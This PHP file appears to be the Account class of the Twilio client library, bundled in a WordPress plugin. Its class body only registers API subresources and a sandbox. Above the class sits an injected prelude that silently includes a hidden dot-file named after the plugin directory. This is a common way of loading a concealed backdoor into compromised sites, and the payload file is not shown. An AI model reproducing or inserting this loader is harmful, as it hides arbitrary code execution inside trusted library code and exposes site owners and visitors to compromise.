<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_Account extends Services_Twilio_InstanceResource {

    protected function init($client, $uri) {
        $this->setupSubresources(
            'applications',
            'available_phone_numbers',
            'outgoing_caller_ids',
            'calls',
            'conferences',
            'incoming_phone_numbers',
            'media',
            'messages',
            'notifications',
            'outgoing_callerids',
            'recordings',
            'sms_messages',
            'short_codes',
            'tokens',
            'transcriptions',
            'connect_apps',
            'authorized_connect_apps',
            'usage_records',
            'usage_triggers',
            'queues',
            'sip',
            'addresses'
        );

        $this->sandbox = new Services_Twilio_Rest_Sandbox(
            $client, $uri . '/Sandbox'
        );
    }
}
